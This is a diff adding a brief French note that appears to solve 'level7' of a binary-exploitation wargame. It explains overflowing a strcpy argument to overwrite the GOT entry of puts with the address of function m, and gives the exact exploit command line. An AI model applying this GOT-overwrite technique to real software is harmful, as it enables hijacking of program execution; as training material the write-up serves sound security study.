@@ -1,0 +1,10 @@
+
+
+1er argument vient changer l'adresse du 1er argument du second strcpy
+
+puis on y ecrit l'adresse de m
+
+donc reecrie l'adresse GOT de puts pour que ça soit m
+
+./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c 'print "\xf4\x84\x04\x08"')
+
